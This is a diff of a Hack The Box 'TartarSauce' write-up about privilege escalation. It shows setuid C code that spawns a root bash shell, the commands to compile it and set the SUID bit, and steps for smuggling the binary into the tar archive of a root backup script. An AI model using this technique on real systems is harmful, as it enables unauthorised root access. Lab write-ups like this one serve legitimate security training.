@@ -302,8 +302,8 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 		---
 		-> testing2
 		```
-		- To exploit this, we have to take advantage of the 30 second sleep and `diff` outputing the contents of the file.
-		- If there is a difference in the content of the archive and `tartarsauce.htb` web directory, the content of the files that are different from each other will be outputed into `/var/backups/onuma_backup_error.txt`
+	- To exploit this, we have to take advantage of the 30 second sleep and `diff` outputing the contents of the file.
+	- If there is a difference in the content of the archive and `tartarsauce.htb` web directory, the content of the files that are different from each other will be outputed into `/var/backups/onuma_backup_error.txt`
 
 2. Exploiting `backuperer`
 	1. Monitor when when `backuperer` is executed
@@ -379,34 +379,32 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 	- If there is any change in content, `/var/tmp/check` will not be deleted, and we can execute the `setuid` file
 3. Exploiting `backuperer`
 	1. Create setuid file 
-		- setuid file
-			```
-			// cat setuid.c
-			#include <unistd.h>
-			
-			int main()
-			{
-				setuid(0);
-				setgid(0);
-				execl("/bin/bash", "bash", (char *)NULL);
-				return 0;
-			}
-			
-			// find . -exec './setuid' \;
-			```
-		- Compile on kali
-			```
-			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
-			└─# gcc -m32 -o setuid exploit.c
-			```
-		- Set permissions 
-			```
-			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
-			└─# chmod 4755 setuid 
-			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
-			└─# ls -la setuid 
-			-rwsr-xr-x 1 root root 15296 Sep 10 00:19 setuid
-			```
+		```
+		# Create setuid.c
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
+		└─# nano setuid.c
+		// cat setuid.c
+		#include <unistd.h>
+		
+		int main()
+		{
+			setuid(0);
+			setgid(0);
+			execl("/bin/bash", "bash", (char *)NULL);
+			return 0;
+		}
+
+		# Compile setuid.c 
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
+		└─# gcc -m32 -o setuid exploit.c
+
+		# Change permissions, set SUID bit			
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
+		└─# chmod 4755 setuid 
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/exploit]
+		└─# ls -la setuid 
+		-rwsr-xr-x 1 root root 15296 Sep 10 00:19 setuid
+		```
 	2. Create an archive of `/var/www/html`  on `tartarsauce.htb`, transfer it to `kali`
 	3. On `kali`, extract it, copy `setuid` file into the extracted directory `<your directory>/var/www/html/`
 		```
